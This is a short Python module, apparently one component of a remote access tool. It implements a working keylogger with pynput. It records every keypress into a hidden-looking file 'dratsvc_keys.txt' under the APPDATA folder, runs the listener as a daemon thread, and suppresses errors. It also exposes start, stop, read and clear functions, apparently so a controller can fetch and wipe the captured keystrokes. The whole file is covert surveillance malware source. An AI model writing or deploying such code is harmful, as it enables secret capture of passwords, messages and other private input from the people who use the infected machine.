import os
import pathlib

from pynput import keyboard

LOG = pathlib.Path(os.getenv('APPDATA', '.')) / 'dratsvc_keys.txt'
_listener = None


def _fmt(k):
    try:
        return k.char or ''
    except AttributeError:
        n = str(k).split('.')[-1]
        return ' ' if n == 'space' else f'[{n.upper()}]'


def _on_press(k):
    try:
        with LOG.open('a', encoding='utf-8') as f:
            f.write(_fmt(k))
    except Exception:
        pass


def start():
    global _listener
    if _listener:
        return False
    _listener = keyboard.Listener(on_press=_on_press)
    _listener.daemon = True
    _listener.start()
    return True


def stop():
    global _listener
    if _listener:
        _listener.stop()
        _listener = None


def read(n=4000):
    if not LOG.exists():
        return '(empty)'
    return LOG.read_text('utf-8', errors='replace')[-n:]


def clear():
    LOG.write_text('')